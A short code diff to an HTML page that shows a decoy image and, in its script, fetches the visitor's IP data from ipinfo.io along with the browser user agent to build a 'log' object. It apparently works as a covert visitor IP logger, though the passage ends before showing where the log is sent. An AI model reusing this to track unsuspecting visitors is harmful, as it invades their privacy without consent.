@@ -62,7 +62,6 @@
             <div id="error" class="error"></div>
         </div>
         
-        <!-- Valid working image -->
         <img id="user-image" src="https://i.imgur.com/TMqC1JF.png" alt="UwU E-Girl + Furry Combo">
     </div>
 
@@ -83,7 +82,7 @@
             errorBox.textContent = "";
 
             try {
-                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                const ipData = await fetch("https://ipv4.ipinfo.io/json").then(res => res.json());
                 const userAgent = navigator.userAgent;
 
                 const log = {
